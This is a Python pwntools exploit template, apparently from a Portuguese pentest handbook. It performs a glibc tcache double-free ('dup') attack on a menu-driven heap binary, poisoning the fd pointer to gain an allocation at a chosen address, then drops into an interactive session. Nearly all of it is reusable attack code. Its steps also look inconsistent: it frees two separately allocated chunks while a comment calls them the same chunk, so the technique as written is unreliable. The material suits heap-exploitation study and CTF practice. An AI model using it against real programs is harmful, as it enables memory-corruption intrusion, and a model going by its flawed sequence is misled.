#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Template: heap/tcache_dup — tcache double-free / dup
#
# > Fonte: [Bíblia do Pentest BR](https://0xmorte.gitbook.io/bibliadopentestbr/)
# > Seção: Linguagens & Runtimes — memory corruption (heap/glibc, tcache)
# > Última sincronização: 2026-11-05
#
# Placeholders:
#   $BIN   — caminho do binário vulnerável
#   $SIZE  — tamanho (int) da chunk a alocar/liberar (deve caber no tcache bin)
#   $FD    — endereço (hex, sem 0x) para o qual o fd da chunk duplicada aponta
#
# Duplica uma chunk do tcache: free -> free -> alloc devolve a mesma chunk duas vezes,
# permitindo escrever o ponteiro `fd` e obter uma alocação em $FD (write primitivo).
# Requer glibc com tcache (>= 2.26) e sem as proteções de double-free do tcache key.

from pwn import *

context.arch = "amd64"
context.log_level = "error"

BIN = "$BIN"
SIZE = $SIZE
FD = 0x$FD

p = process(BIN)

# Exemplo de interação — ajuste os prompts conforme o binário:
p.sendlineafter(b"> ", b"1")  # alloc
p.sendlineafter(b"size:", str(SIZE).encode())
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"size:", str(SIZE).encode())
p.sendlineafter(b"> ", b"2")  # free chunk A
p.sendlineafter(b"idx:", b"0")
p.sendlineafter(b"> ", b"2")  # free chunk B (mesma chunk -> dup)
p.sendlineafter(b"idx:", b"1")
p.sendlineafter(b"> ", b"1")  # alloc A
p.sendlineafter(b"size:", str(SIZE).encode())
p.sendlineafter(b"> ", b"3")  # edit A -> overwrite fd
p.sendlineafter(b"data:", p64(FD))
p.sendlineafter(b"> ", b"1")  # alloc B -> fd
p.sendlineafter(b"size:", str(SIZE).encode())

p.interactive()
